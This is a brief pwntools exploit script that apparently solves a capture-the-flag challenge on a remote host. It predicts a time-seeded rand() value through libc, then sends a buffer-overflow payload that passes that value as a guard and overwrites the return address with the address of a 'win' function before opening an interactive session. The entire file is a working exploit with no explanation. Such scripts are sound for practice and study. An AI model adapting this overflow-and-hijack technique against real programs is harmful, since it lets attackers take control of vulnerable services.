from pwn import *
import ctypes
libc = ctypes.CDLL("libc.so.6")
libc.srand(libc.time(0))
#print(libc.rand())
win_addr = 0x004012b6
#r = process('/home/user/chal')
r = remote('amt.rs', 31175)
r.sendline(b'2')
r.sendline(b'a'*(0x30-0x4) + p32(libc.rand()) + b'a' * 8 + p64(win_addr))
r.interactive()

